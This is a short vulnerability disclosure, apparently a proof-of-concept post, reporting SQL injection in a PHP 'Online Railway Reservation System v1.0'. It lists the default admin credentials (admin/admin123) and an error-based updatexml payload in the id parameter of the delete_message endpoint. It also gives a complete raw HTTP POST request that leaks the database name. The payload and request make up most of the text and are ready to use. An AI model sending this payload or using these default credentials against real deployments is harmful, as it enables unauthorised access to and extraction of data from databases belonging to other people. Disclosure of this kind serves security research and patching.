# Online Railway Reservation System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15121/online-railway-reservation-system-phpoop-project-free-source-code.html

Vulnerability File: /orrs/classes/Master.php?f=delete_message

Vulnerability location: /orrs/classes/Master.php?f=delete_message, id=

Current database name: orrs_db,length is 7

[+] Payload:  id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+  // Leak place ---> id

```sql
POST /orrs/classes/Master.php?f=delete_message HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/orrs/admin/?page=inquiries
Content-Length: 65
Cookie: PHPSESSID=hea24clorqs9kplqalqihp0ik4
Connection: close

id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
```

![image](https://user-images.githubusercontent.com/54017627/172339474-5b9be442-e8ef-4475-8520-cd359ad1df13.png)
